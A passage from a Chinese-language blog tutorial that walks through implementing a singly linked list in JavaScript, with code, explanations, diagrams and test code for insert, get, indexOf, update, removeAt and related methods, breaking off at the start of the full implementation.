src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/9.png" alt="image-20200306103312580"></a></p><ul><li><strong>情况2：position &gt; 0</strong>：</li></ul><p>首先定义两个变量previous和curent分别指向需要插入位置pos = X的前一个节点和后一个节点；</p><p>然后，通过：newNode.next = current，改变指向3；</p><p>最后，通过：previous.next = newNode，改变指向4；</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/10.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/10.png" alt="image-20200306103541674"></a></p><ul><li><strong>情况2的特殊情形：position = length</strong>：</li></ul><p>情况2也包含了pos = length的情况，该情况下current和newNode.next都指向null；建立连接3和连接4的方式与情况2相同。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/11.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/11.png" alt="image-20200306103646576"></a></p><p><strong>测试代码：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="comment">//1.创建LinkList</span></span><br><span class="line">let list = <span class="built_in">new</span> LinkList()</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.插入数据</span></span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">list.<span class="built_in">append</span>(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试insert方法</span></span><br><span class="line">list.insert(<span class="number">0</span>, <span class="string">&#x27;在链表最前面插入节点&#x27;</span>);</span><br><span class="line">list.insert(<span class="number">2</span>, <span class="string">&#x27;在链表中第二个节点后插入节点&#x27;</span>);</span><br><span class="line">list.insert(<span class="number">5</span>, <span class="string">&#x27;在链表最后插入节点&#x27;</span>);</span><br><span class="line">alert(list);</span><br><span class="line">console.log(list);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/12.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/12.png" alt="image-20200305235710063"></a></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/13.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/13.png" alt="image-20200305235756962"></a></p><h4 id="2-4-get-position"><a href="#2-4-get-position" class="headerlink" title="2.4.get(position)"></a>2.4.get(position)</h4><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现get方法</span></span><br><span class="line">LinkList.prototype.<span class="keyword">get</span> = (position) =&gt; &#123;</span><br><span class="line">  <span class="comment">//1.越界判断</span></span><br><span class="line">  <span class="comment">// 当position = length时，取到的是null所以0 =&lt; position &lt; length</span></span><br><span class="line">  <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt;= <span class="keyword">this</span>.length)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//2.获取指定的positon位置的后一个节点的data</span></span><br><span class="line">  <span class="comment">//同样使用一个变量间接操作节点</span></span><br><span class="line">  let current = <span class="keyword">this</span>.head</span><br><span class="line">  let index = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span>(index++ &lt; position)&#123;</span><br><span class="line">    current = current.next</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> current.<span class="keyword">data</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>get方法的实现过程：以获取position = 2为例，如下图所示：</p><ul><li>首先使current指向第一个节点，此时index=0；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/14.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/14.png" alt="image-20200227164308939"></a></p><ul><li>通过while循环使current循环指向下一个节点，注意循环终止的条件index++ &lt; position，即当index=position时停止循环，此时循环了1次，current指向第二个节点(Node2)，最后通过current.data返回Node2节点的数据；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/15.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/15.png" alt="image-20200227164351066"></a></p><p><strong>测试代码：</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line">   <span class="comment">//1.创建LinkList</span></span><br><span class="line">   <span class="keyword">let</span> list = <span class="keyword">new</span> LinkList()</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//2.插入数据</span></span><br><span class="line">   list.append(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">   list.append(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">   list.append(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试get方法</span></span><br><span class="line">   console.log(list.<span class="keyword">get</span>(<span class="number">0</span>));</span><br><span class="line">   console.log(list.<span class="keyword">get</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/16.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/16.png" alt="image-20200306000211073"></a></p><h4 id="2-5-indexOf-element"><a href="#2-5-indexOf-element" class="headerlink" title="2.5.indexOf(element)"></a>2.5.indexOf(element)</h4><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现indexOf方法</span></span><br><span class="line">LinkList.prototype.indexOf = <span class="keyword">data</span> =&gt; &#123;</span><br><span class="line">  <span class="comment">//1.定义变量</span></span><br><span class="line">  let current = <span class="keyword">this</span>.head</span><br><span class="line">  let index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.开始查找:只要current不指向null就一直循环</span></span><br><span class="line">  <span class="keyword">while</span>(current)&#123;</span><br><span class="line">    <span class="keyword">if</span>(current.<span class="keyword">data</span> == <span class="keyword">data</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> index</span><br><span class="line">    &#125;</span><br><span class="line">    current = current.next</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//3.遍历完链表没有找到，返回-1</span></span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>indexOf方法的实现过程：</p><ul><li>使用变量current记录当前指向的节点，使用变量index记录当前节点的索引值（注意index = node数-1）：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/17.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/17.png" alt="image-20200227155230599"></a></p><p><strong>测试代码：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line">   <span class="comment">//1.创建LinkList</span></span><br><span class="line">   let list = <span class="built_in">new</span> LinkList()</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//2.插入数据</span></span><br><span class="line">   list.<span class="built_in">append</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">   list.<span class="built_in">append</span>(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">   list.<span class="built_in">append</span>(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//3.测试indexOf方法</span></span><br><span class="line">   console.log(list.indexOf(<span class="string">&#x27;aaa&#x27;</span>));</span><br><span class="line">   console.log(list.indexOf(<span class="string">&#x27;ccc&#x27;</span>));</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/18.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/18.png" alt="image-20200306000424189"></a></p><h4 id="2-6-update-position-element"><a href="#2-6-update-position-element" class="headerlink" title="2.6.update(position,element)"></a>2.6.update(position,element)</h4><p><strong>代码实现：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现update方法</span></span><br><span class="line">LinkList.prototype.update = <span class="function">(<span class="params">position, newData</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//1.越界判断</span></span><br><span class="line">  <span class="comment">//因为被修改的节点不能为null，所以position不能等于length</span></span><br><span class="line">  <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt;= <span class="built_in">this</span>.length)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//2.查找正确的节点</span></span><br><span class="line">  <span class="keyword">let</span> current = <span class="built_in">this</span>.head</span><br><span class="line">  <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span>(index++ &lt; position)&#123;</span><br><span class="line">    current = current.next</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3.将position位置的后一个节点的data修改成newData</span></span><br><span class="line">  current.data = newData</span><br><span class="line">  <span class="comment">//返回true表示修改成功</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line">   <span class="comment">//1.创建LinkList</span></span><br><span class="line">   let list = <span class="built_in">new</span> LinkList()</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//2.插入数据</span></span><br><span class="line">   list.<span class="built_in">append</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">   list.<span class="built_in">append</span>(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">   list.<span class="built_in">append</span>(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//3.测试update方法</span></span><br><span class="line">   list.update(<span class="number">0</span>, <span class="string">&#x27;修改第一个节点&#x27;</span>)</span><br><span class="line">   list.update(<span class="number">1</span>, <span class="string">&#x27;修改第二个节点&#x27;</span>)</span><br><span class="line">   console.log(list);</span><br><span class="line">   console.log(list.update(<span class="number">3</span>, <span class="string">&#x27;能修改么&#x27;</span>));</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/19.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/19.png" alt="image-20200306000700656"></a></p><h4 id="2-7-removeAt-position"><a href="#2-7-removeAt-position" class="headerlink" title="2.7.removeAt(position)"></a>2.7.removeAt(position)</h4><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现removeAt方法</span></span><br><span class="line">LinkList.prototype.removeAt = position =&gt; &#123;</span><br><span class="line">  <span class="comment">//1.越界判断</span></span><br><span class="line">  <span class="keyword">if</span> (position &lt; <span class="number">0</span> || position &gt;= <span class="keyword">this</span>.length) &#123;<span class="comment">//position不能为length</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//2.删除元素</span></span><br><span class="line">  <span class="comment">//情况1：position = 0时(删除第一个节点)</span></span><br><span class="line">  let current = <span class="keyword">this</span>.head</span><br><span class="line">  <span class="keyword">if</span> (position ==<span class="number">0</span> ) &#123;</span><br><span class="line">  <span class="comment">//情况2：position &gt; 0时</span></span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">this</span>.head.next</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    let index = <span class="number">0</span></span><br><span class="line">    let previous = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">while</span> (index++ &lt; position) &#123;</span><br><span class="line">      previous = current</span><br><span class="line">      current = current.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//循环结束后，current指向position后一个节点，previous指向current前一个节点</span></span><br><span class="line">    <span class="comment">//再使前一个节点的next指向current的next即可</span></span><br><span class="line">    previous.next = current.next</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3，length-1</span></span><br><span class="line">  <span class="keyword">this</span>.length -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//返回被删除节点的data，为此current定义在最上面</span></span><br><span class="line">  <span class="keyword">return</span> current.<span class="keyword">data</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过程详解：</strong></p><p>removeAt方法的实现过程：删除节点时存在多种情况：</p><ul><li><strong>情况1：position = 0</strong>，即移除第一个节点（Node1）。</li></ul><p>通过：this.head = this.head.next，改变指向1即可；</p><p>虽然Node1的next仍指向Node2，但是没有引用指向Node1，则Node1会被垃圾回收器自动回收，所以不用处理Node1指向Node2的引用next。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/20.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/20.png" alt="image-20200306110518877"></a></p><ul><li><strong>情况2：positon &gt; 0</strong>，比如pos = 2即移除第三个节点（Node3）。</li></ul><p><strong>注意：</strong>position = length时position后一个节点为null不能删除，因此position != length；</p><p>首先，定义两个变量previous和curent分别指向需要删除位置pos = x的前一个节点和后一个节点；</p><p>然后，通过：previous.next = current.next，改变指向1即可；</p><p>随后，没有引用指向Node3，Node3就会被自动回收，至此成功删除Node3 。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/21.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/21.png" alt="image-20200306104624457"></a></p><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//测试代码</span></span><br><span class="line">  <span class="comment">//1.创建LinkList</span></span><br><span class="line">  <span class="keyword">let</span> list = <span class="keyword">new</span> LinkList()</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//2.插入数据</span></span><br><span class="line">  list.append(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">  list.append(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">  list.append(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.测试removeAt方法</span></span><br><span class="line">  <span class="built_in">console</span>.log(list.removeAt(<span class="number">0</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(list.removeAt(<span class="number">0</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(list);</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/22.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/22.png" alt="image-20200306000839608"></a></p><h4 id="2-8-其他方法"><a href="#2-8-其他方法" class="headerlink" title="2.8.其他方法"></a>2.8.其他方法</h4><p>其他方法包括：<strong>remove(element)、isEmpty()、size()</strong></p><p><strong>代码实现：</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------其他方法的实现--------------*/</span></span><br><span class="line">      <span class="comment">//一.实现remove方法</span></span><br><span class="line">      LinkList.prototype.remove = (<span class="keyword">data</span>) =&gt; &#123;</span><br><span class="line">        <span class="comment">//1.获取data在列表中的位置</span></span><br><span class="line">        let position = <span class="keyword">this</span>.indexOf(<span class="keyword">data</span>)</span><br><span class="line">        <span class="comment">//2.根据位置信息，删除结点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.removeAt(position)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//二.实现isEmpty方法</span></span><br><span class="line">      LinkList.prototype.isEmpty = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.length == <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//三.实现size方法</span></span><br><span class="line">      LinkList.prototype.size = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.length</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><strong>测试代码：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//测试代码</span></span><br><span class="line">    <span class="comment">//1.创建LinkList</span></span><br><span class="line">    <span class="keyword">let</span> list = <span class="keyword">new</span> LinkList()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2.插入数据</span></span><br><span class="line">    list.append(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    list.append(<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">    list.append(<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*---------------其他方法测试----------------*/</span></span><br><span class="line">  <span class="comment">//remove方法</span></span><br><span class="line">  <span class="built_in">console</span>.log(list.remove(<span class="string">&#x27;aaa&#x27;</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(list);</span><br><span class="line">  <span class="comment">//isEmpty方法</span></span><br><span class="line">  <span class="built_in">console</span>.log(list.isEmpty());</span><br><span class="line">  <span class="comment">//size方法</span></span><br><span class="line">  <span class="built_in">console</span>.log(list.size());</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/23.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8/23.png" alt="image-20200306001247346"></a></p><h4 id="2-9-完整实现"><a href="#2-9-完整实现" class="headerlink" title="2.9.完整实现"></a>2.9.完整实现</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 